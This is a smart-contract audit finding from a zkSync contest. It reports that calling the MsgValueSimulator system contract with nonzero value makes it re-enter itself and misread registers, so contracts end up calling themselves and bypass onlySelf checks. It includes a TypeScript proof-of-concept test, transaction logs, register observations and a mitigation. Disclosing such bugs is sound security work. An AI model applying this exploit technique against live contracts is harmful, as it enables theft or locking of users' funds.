## Tags

- bug
- 3 (High Risk)
- satisfactory
- selected for report
- sponsor disputed
- upgraded by judge
- H-01

# [The call to MsgValueSimulator with non zero msg.value will call to sender itself which will bypass the onlySelf check](https://github.com/code-423n4/2023-03-zksync-findings/issues/153) 

# Lines of code

https://github.com/code-423n4/2023-03-zksync/blob/main/contracts/MsgValueSimulator.sol#L22-L63


# Vulnerability details

## Impact
First, I need to clarify, there may be more serious ways to exploit this issue. Due to the lack of time and documents, I cannot complete further exploit. The current exploit has only achieved the impact in the title. I will expand the possibility of further exploit in the poc chapter.

The call to MsgValueSimulator with non zero msg.value will call to sender itself with the msg.data. It means that if you can make a contract or a custom account call to specified address with non zero msg.value (that's very common in withdrawal functions and smart contract wallets), you can make the contract/account call itself. And if you can also control the calldata, you can make the contract/account call its functions by itself.

It will bypass some security check with the msg.sender, or break the accounting logic of some contracts which use the msg.sender as account name.

For example the `onlySelf` modifier in the ContractDepolyer contract:
```
modifier onlySelf() {
    require(msg.sender == address(this), "Callable only by self");
    _;
}
```

## Proof of Concept
The `MsgValueSimulator` use the `mimicCall` to forward the original call.
```
return EfficientCall.mimicCall(gasleft(), to, _data, msg.sender, false, isSystemCall);
```

And if the `to` address is the `MsgValueSimulator` address, it will go back to the `MsgValueSimulator.fallback` function again. 

The fallback function will  Extract the `value` to send, isSystemCall flag and the `to` address from the extraAbi params(r3,r4,r5) in the `_getAbiParams` function. But it's different from the first call to the `MsgValueSimulator`. The account uses `EfficientCall.rawCall` function to call the `MsgValueSimulator.fallback` in the first call. For example, code in `DefaultAccount._execute`:
```
bool success = EfficientCall.rawCall(gas, to, value, data);
```

The rawCall will simulate `system_call_byref` opcode to call the `MsgValueSimulator`. And the `system_call_byref` will write the r3-r5 registers which are read as the above extraAbi params. 

But the second call is sent by `EfficientCall.mimicCall`, as the return value explained in the document https://github.com/code-423n4/2023-03-zksync/blob/main/docs/VM-specific_v1.3.0_opcodes_simulation.pdf, `mimicCall` will mess up the registers and will use r1-r4 for standard ABI convention and r5 for the extra who_to_mimic arg. So extraAbi params(r3-r5) read by `_getAbiParams` will be messy data. It can lead to very serious consequences, because the r3 will be used as the msg.value, and the r4 will be used as the `to` address in the final `mimicCall`. It means that the contract will send a different(greater) value to a different address, which is unexpected in the original call.

I really don't know how to write a complex test to verify register changes in the era-compiler-tester. So to find out how to control the registers, I use the repo https://github.com/matter-labs/zksync-era and replace the etc/system-contracts/ codes with the lastest version in the contest, and write a integration test.
```
import { TestMaster } from '../src/index';
import * as zksync from 'zksync-web3';
import { BigNumber } from 'ethers';

describe('ETH token checks', () => {
    let testMaster: TestMaster;
    let alice: zksync.Wallet;
    let bob: zksync.Wallet;

    beforeAll(() => {
        testMaster = TestMaster.getInstance(__filename);
        alice = testMaster.mainAccount();
        bob = testMaster.newEmptyAccount();
    });

    test('Can perform a transfer (legacy)', async () => {
        const LEGACY_TX_TYPE = 0;
        const value = BigNumber.from(30000);
        
        const MSG_VALUE_SYSTEM_CONTRACT = "0x0000000000000000000000000000000000008009";
        console.log(await alice.getBalance());
        console.log(await alice.provider.getBalance(MSG_VALUE_SYSTEM_CONTRACT));

        let block = await alice.provider.getBlock("latest");
        console.log("block gas limit", block.gasLimit);
        let tx_gasLimit = block.gasLimit.div(8);
        console.log("tx_gasLimit", tx_gasLimit);
        console.log("gas price", await alice.getGasPrice());

        try {
            let tx = await alice.sendTransaction({ type: LEGACY_TX_TYPE, to: MSG_VALUE_SYSTEM_CONTRACT, value , gasLimit: tx_gasLimit, data: '0x'});
            let txp = await tx.wait();
            console.log("success");
            console.log(txp["logs"]);
        } catch (err ) {
            console.log("fail");
            console.log(err);
            console.log('--------');
            console.log(err["receipt"]["logs"]);
        }
        
        console.log(await alice.getBalance());
        console.log(await alice.provider.getBalance(MSG_VALUE_SYSTEM_CONTRACT));
        console.log(await alice.getNonce());
    });

    afterAll(async () => {
        await testMaster.deinitialize();
    });
});

```
The L2EthToken Transfer event logs:
```
    {
        transactionIndex: 0,
        blockNumber: 25,
        transactionHash: '0x997b6536c802620e56f8c1b54a0bd3092dfe3dde457f91ca75ec07740c82fde1',
        address: '0x000000000000000000000000000000000000800A',
        topics: [
          '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',
          '0x0000000000000000000000006a8b37bcf2decff1452fccedc1452257d016b5c4',
          '0x0000000000000000000000000000000000000000000000000000000000008009'
        ],
        data: '0x0000000000000000000000000000000000000000000000000000000000007530',
        logIndex: 1,
        blockHash: '0xafb60d1285fc9ac08db01b02df01f6cbb668918d98f1b9254ed150a95957ba75'
      },
      {
        transactionIndex: 0,
        blockNumber: 25,
        transactionHash: '0x997b6536c802620e56f8c1b54a0bd3092dfe3dde457f91ca75ec07740c82fde1',
        address: '0x000000000000000000000000000000000000800A',
        topics: [
          '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',
          '0x0000000000000000000000006a8b37bcf2decff1452fccedc1452257d016b5c4',
          '0x0000000000000000000000006a8b37bcf2decff1452fccedc1452257d016b5c4'
        ],
        data: '0x00000000000000000000000000000000000000000002129c0000000a00000000',
        logIndex: 2,
        blockHash: '0xafb60d1285fc9ac08db01b02df01f6cbb668918d98f1b9254ed150a95957ba75'
      }
```
There are two l2 eth token transaction in addition to gas processing. And the value sent to the `MsgValueSimulator` will stuck in the contract forever.

I found that the r4(to) is always msg.sender, the r5(mask) is always 0x1, and if the length of the calldata is 0, the r3(value) will be `0x2129c0000000a00000000`, and if the length > 0, r3(value) will be `0x215800000000a00000000 + calldata.length << 96`. So in this case, the balance of the sender should be at least 0x2129c0000000a00000000 wei to finish the whole transaction whitout reverting.

I did not find any document about the `standard ABI convention` mentioned in the VM-specific_v1.3.0_opcodes_simulation.pdf and the r5 is also not really the extra who_to_mimic arg. I didn't make a more serious exploit due to lack of time. I'd like more documentation about register call conventions to verify the possibility of manipulating registers.

## Tools Used
Manual review
## Recommended Mitigation Steps
Check the `to` address in the `MsgValueSimulator` contract.  The `to` address must not be the `MsgValueSimulator` address.